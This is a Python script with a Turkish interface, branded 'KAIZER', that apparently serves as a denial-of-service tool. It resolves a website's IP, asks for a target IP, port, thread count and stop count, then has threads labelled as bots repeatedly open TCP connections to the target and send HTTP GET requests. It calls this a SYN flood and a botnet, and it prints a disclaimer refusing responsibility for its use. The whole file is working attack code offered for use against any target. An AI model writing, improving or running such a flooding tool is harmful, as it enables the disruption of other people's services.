import socket
import threading
import netifaces
import time
import sys
import pyfiglet
import requests
from colorama import Fore, Style
from urllib.parse import urlparse



import pyfiglet
from colorama import Fore
import time

def slow_print(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.016)
    print()

def figlet():
    ascii_art = pyfiglet.figlet_format("          KAIZER")
    print(Fore.GREEN)
    slow_print(ascii_art)

print(Fore.GREEN + """
DİKKAT YAPILAN İŞLEMLER İÇİN SORUMLULUK KABUL
               ETMİYORUZ""")
time.sleep(1.5)
figlet()


saldırı_hızı = 1
saldırı_zamanlayıcı = 1 / saldırı_hızı

saldırı_devam_ediyor = False
saldırı_sayacı = 0
maksimum_saldırı = None


def get_external_ip(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.text
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    return None


def get_local_ip_addresses():
    ip_addresses = []
    interfaces = netifaces.interfaces()
    for interface in interfaces:
        addresses = netifaces.ifaddresses(interface).get(netifaces.AF_INET)
        if addresses:
            for address_info in addresses:
                ip_addresses.append(address_info['addr'])
    return ip_addresses


def list_local_ip_addresses():
    ip_addresses = get_local_ip_addresses()
    print(Fore.GREEN + "  Yerel IP Adresiniz: ")
    for ip in ip_addresses:
        print(Fore.YELLOW + "  " + ip)


def get_ip_and_port_from_url(url):
    try:
        parsed_url = urlparse(url)
        return socket.gethostbyname(parsed_url.hostname), parsed_url.port
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    return None, None


def list_external_ip_address():
    input_url = input(Fore.GREEN + "  Link Gir La gardaş: ")
    parsed_url = urlparse(input_url)
    if parsed_url.scheme:
        try:
            ip_address = socket.gethostbyname(parsed_url.netloc)
            print(Fore.GREEN + f"  Site IP Adresi: {ip_address}")
        except Exception as e:
            print(Fore.RED + f"Hata: {e}")
    else:
        print(Fore.RED + "  Geçersiz URL!")


def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False


def is_valid_port(port):
    try:
        port = int(port)
        return 0 < port <= 65535
    except ValueError:
        return False


def get_valid_ip():
    while True:
        ip = input(Fore.GREEN + "  Hedef IP Adresini Girin: ")
        if is_valid_ip(ip):
            return ip
        else:
            print(Fore.RED + "  Geçersiz IP adresi! Doğru IP Adresi Girin.")


def get_valid_port():
    while True:
        port = input(Fore.GREEN + "  Hedef Port Numarasını Girin: ")
        if is_valid_port(port):
            return int(port)
        else:
            print(Fore.RED + "  Geçersiz Port Numarası!")


def saldırı_durumu_görselleştir():
    while saldırı_devam_ediyor and (maksimum_saldırı is None or saldırı_sayacı < maksimum_saldırı):
        print(Fore.CYAN + f"         Saldırı Devam Ediyor: {saldırı_sayacı}/{maksimum_saldırı} paket gönderildi")
        time.sleep(saldırı_zamanlayıcı)
        time.sleep(1)


def botnet_olustur(hedef_ip, hedef_port, bot_sayisi):
    def syn_flood_saldırısı(bot_numarası, hedef_ip, hedef_port):
        global saldırı_devam_ediyor
        global saldırı_sayacı
        while saldırı_devam_ediyor and (maksimum_saldırı is None or saldırı_sayacı < maksimum_saldırı):
            try:
                bot_soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                bot_soket.connect((hedef_ip, hedef_port))
                bot_soket.send(b"GET / HTTP/1.1\r\n")
                bot_soket.send(b"Host: " + hedef_ip.encode() + b"\r\n\r\n")
                bot_soket.close()
                print(Fore.GREEN + f"         Saldırı Başlatıldı: Bot-{bot_numarası}, Hedef: {hedef_ip}:{hedef_port}")
                time.sleep(0.5)
                saldırı_sayacı += 1
            except Exception as e:
                print(Fore.RED + f"\n         Hata Oluştu Geçersiz IP Adresi Yada Port:\n        {e}")
                saldırı_devam_ediyor = False
                sys.exit()

        if not saldırı_devam_ediyor:
            print(Fore.YELLOW + "  Saldırı Durduruldu. Ana Menüye Dönülüyor...")
            time.sleep(3)
            main_menu()

    for i in range(bot_sayisi):
        bot_thread = threading.Thread(target=syn_flood_saldırısı, args=(i+1, hedef_ip, hedef_port))
        bot_thread.daemon = True
        bot_thread.start()

    threading.Thread(target=saldırı_durumu_görselleştir).start()


def main_menu():
    global saldırı_devam_ediyor
    global saldırı_sayacı
    global maksimum_saldırı
    while True:
        time.sleep(2)
        print(Fore.GREEN + "  [1] IP Adres Bilgilerin")
        print(Fore.GREEN + "  [2] Link Gir IP Çeksin")
        print(Fore.GREEN + "  [3] IP Saldırı Yap")
        print(Fore.GREEN + "  [4] Çıkış Yap")
        choice = input(Fore.GREEN + "  ~$ ")
        if choice == "1":
            list_local_ip_addresses()
        elif choice == "2":
            list_external_ip_address()
        elif choice == "3":
            attack_menu()
        elif choice == "4":
            print(Fore.YELLOW + "  Çıkış Yapılıyor...")
            time.sleep(2)
            saldırı_devam_ediyor = False
            sys.exit()
        else:
            print(Fore.RED + "  GEÇERSİZ SEÇİM!")


def attack_menu():
    global saldırı_devam_ediyor
    global saldırı_sayacı
    global maksimum_saldırı
    hedef_ip = get_valid_ip()
    hedef_port = get_valid_port()
    bot_sayisi = int(input(Fore.GREEN + "  Bot Sayısını Girin: "))
    maksimum_saldırı = int(input(Fore.GREEN + "  Saldırı Kaç Olunca Durdurulsun: "))

    print(Fore.CYAN + f"  Botnet Saldırısı Başlatılıyor...")
    print(Fore.CYAN + f"  Hedef IP: {hedef_ip}")
    print(Fore.CYAN + f"  Hedef Port: {hedef_port}")
    print(Fore.CYAN + f"  Bot Sayısı: {bot_sayisi}")
    print(Fore.CYAN + f"  Saldırı Kaç Olunca Durdurulsun: {maksimum_saldırı}")

    saldırı_devam_ediyor = True
    botnet_olustur(hedef_ip, hedef_port, bot_sayisi)

    while saldırı_devam_ediyor and (maksimum_saldırı is None or saldırı_sayacı < maksimum_saldırı):
        pass


if __name__ == "__main__":
    main_menu()
